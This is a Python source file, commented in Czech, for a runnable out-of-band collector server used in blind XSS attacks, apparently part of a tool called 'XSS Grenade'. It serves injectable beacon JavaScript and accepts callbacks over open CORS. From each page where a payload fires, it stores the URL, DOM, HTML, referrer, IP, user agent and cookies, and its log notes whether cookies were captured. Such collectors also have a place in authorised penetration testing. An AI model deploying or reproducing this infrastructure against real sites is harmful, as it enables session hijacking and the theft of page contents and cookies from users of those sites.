"""
_oob_collector.py — self-hosted OOB collector pro blind XSS (v10.47)

Runnable HTTP server, který:
  - servíruje beacon JS na  GET /<token>.js   (pro <script src=//host/token.js>)
  - přijímá callbacky na     GET /c?t=…&u=…   (Image beacon) i POST /c (fetch JSON)
  - ukládá callbacky (paměť + volitelně JSONL na disk)
  - vystavuje GET /results (JSON) a má get_callbacks() pro in-process korelaci

Reálné nasazení: spustit na vlastním VPS s doménou + TLS (za nginx). Modul
neřeší TLS — to je věc deploymentu. Pro samostatný běh:

    python -m _oob_collector --host 0.0.0.0 --port 8080 \
        --public-url https://oob.mydomain.com --out callbacks.jsonl

Pak v skenu: OOBConfig(collector_url="https://oob.mydomain.com").
"""
import json
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Dict, List, Optional, Callable
from urllib.parse import urlparse, parse_qs

from _blind_xss_oob import build_beacon_js


class _Store:
    def __init__(self, out_path: Optional[str] = None):
        self._lock = threading.Lock()
        self._cbs: List[Dict] = []
        self._out_path = out_path

    def add(self, cb: Dict):
        cb.setdefault("received_at", time.time())
        with self._lock:
            self._cbs.append(cb)
            if self._out_path:
                try:
                    with open(self._out_path, "a", encoding="utf-8") as f:
                        f.write(json.dumps(cb, ensure_ascii=False) + "\n")
                except Exception:
                    pass

    def all(self) -> List[Dict]:
        with self._lock:
            return list(self._cbs)


def _make_handler(store: _Store, callback_path: str, js_suffix: str,
                  on_log: Callable[[str], None]):
    class _H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def _cors(self):
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
            self.send_header("Access-Control-Allow-Headers", "*")

        def _client_ip(self):
            xff = self.headers.get("X-Forwarded-For")
            if xff:
                return xff.split(",")[0].strip()
            return self.client_address[0] if self.client_address else ""

        def do_OPTIONS(self):
            self.send_response(204); self._cors(); self.end_headers()

        def do_GET(self):
            u = urlparse(self.path)
            # beacon JS:  /<token>.js
            if u.path.endswith(js_suffix) and u.path != callback_path:
                token = u.path[1:-len(js_suffix)]
                host = self.headers.get("Host", "")
                js = build_beacon_js(host, token, callback_path)
                b = js.encode()
                self.send_response(200)
                self.send_header("Content-Type", "application/javascript")
                self.send_header("Content-Length", str(len(b)))
                self._cors(); self.end_headers(); self.wfile.write(b)
                on_log(f"[OOB] beacon JS served for token={token}")
                return
            # callback (Image GET):  /c?t=…&u=…&dom=…&ref=…
            if u.path == callback_path:
                q = parse_qs(u.query)
                cb = {
                    "token": (q.get("t") or [""])[0],
                    "u": (q.get("u") or [""])[0],
                    "dom": (q.get("dom") or [""])[0],
                    "ref": (q.get("ref") or [""])[0],
                    "method": "GET",
                    "ip": self._client_ip(),
                    "ua": self.headers.get("User-Agent", ""),
                }
                if cb["token"]:
                    store.add(cb)
                    on_log(f"[OOB] ✓ callback GET token={cb['token']} fired_at={cb['u'][:60]}")
                b = (b"GIF89a")  # 1px gif-ish
                self.send_response(200)
                self.send_header("Content-Type", "image/gif")
                self.send_header("Content-Length", str(len(b)))
                self._cors(); self.end_headers(); self.wfile.write(b)
                return
            # results
            if u.path == "/results":
                b = json.dumps(store.all(), ensure_ascii=False).encode()
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(b)))
                self._cors(); self.end_headers(); self.wfile.write(b)
                return
            self.send_response(404); self._cors(); self.end_headers()

        def do_POST(self):
            u = urlparse(self.path)
            if u.path == callback_path:
                try:
                    ln = int(self.headers.get("Content-Length", 0) or 0)
                    raw = self.rfile.read(ln).decode("utf-8", "replace") if ln else ""
                    data = {}
                    try:
                        data = json.loads(raw) if raw else {}
                    except Exception:
                        data = {"raw": raw[:4000]}
                    cb = {
                        "token": data.get("t") or data.get("token") or "",
                        "u": data.get("u", ""), "origin": data.get("o", ""),
                        "dom": data.get("dom", ""), "ref": data.get("ref", ""),
                        "title": data.get("title", ""), "ck": data.get("ck", ""),
                        "html": data.get("html", ""),
                        "method": "POST", "ip": self._client_ip(),
                        "ua": self.headers.get("User-Agent", ""),
                    }
                    if cb["token"]:
                        store.add(cb)
                        on_log(f"[OOB] ✓ callback POST token={cb['token']} "
                               f"fired_at={cb['u'][:60]} cookies={'yes' if cb['ck'] else 'no'}")
                except Exception:
                    pass
                self.send_response(204); self._cors(); self.end_headers()
                return
            self.send_response(404); self._cors(); self.end_headers()
    return _H


class OOBCollector:
    """Spustitelný collector. start() v threadu, get_callbacks() pro korelaci."""

    def __init__(self, host: str = "127.0.0.1", port: int = 0,
                 callback_path: str = "/c", js_suffix: str = ".js",
                 out_path: Optional[str] = None,
                 on_log: Optional[Callable[[str], None]] = None):
        self.host = host
        self.port = port
        self.callback_path = callback_path
        self.js_suffix = js_suffix
        self.store = _Store(out_path)
        self._log = on_log or (lambda m: None)
        self._srv = None
        self._thread = None

    def start(self) -> "OOBCollector":
        handler = _make_handler(self.store, self.callback_path,
                                self.js_suffix, self._log)
        self._srv = ThreadingHTTPServer((self.host, self.port), handler)
        self._srv.daemon_threads = True
        self.port = self._srv.server_address[1]
        self._thread = threading.Thread(target=self._srv.serve_forever, daemon=True)
        self._thread.start()
        self._log(f"[OOB] collector poslouchá na {self.host}:{self.port}")
        return self

    def get_callbacks(self) -> List[Dict]:
        return self.store.all()

    def stop(self):
        if self._srv is not None:
            try: self._srv.shutdown()
            except Exception: pass
            try: self._srv.server_close()
            except Exception: pass


def _main():
    import argparse
    ap = argparse.ArgumentParser(description="XSS Grenade OOB collector (blind XSS)")
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--out", default=None, help="JSONL soubor pro callbacky")
    args = ap.parse_args()
    c = OOBCollector(host=args.host, port=args.port, out_path=args.out,
                     on_log=lambda m: print(m, flush=True)).start()
    print(f"[OOB] běží na http://{args.host}:{args.port} — Ctrl+C ukončí", flush=True)
    try:
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        c.stop()


if __name__ == "__main__":
    _main()
